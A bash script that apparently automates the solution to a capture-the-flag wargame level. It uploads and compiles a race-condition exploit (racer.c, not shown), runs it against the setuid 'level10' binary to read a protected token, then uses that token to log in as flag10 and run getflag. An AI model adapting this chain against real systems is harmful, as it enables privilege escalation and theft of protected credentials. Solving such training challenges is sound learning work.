#!/usr/bin/env bash

set -euo pipefail

PARENT_DIR="$(dirname "$0")"
UTILS_DIR="$PARENT_DIR/../utils"

PATH="$UTILS_DIR:$PATH"

host="$1"
port="$2"
pass="$3"

pass.exp "$pass" scp -P "$port" "$PARENT_DIR/racer.c" "level10@$host:/tmp/racer.c" > /dev/null
pass=$(sshexec.sh "$host" "$port" level10 "$pass" \
'set -e; cd /tmp; gcc -Wall -Wextra -Werror --std=gnu99 racer.c -o racer -pthread; ./racer ~/level10 ~/token 2>/dev/null | tail -n+2')

sshexec.sh "$host" "$port" flag10 "$pass" 'getflag'
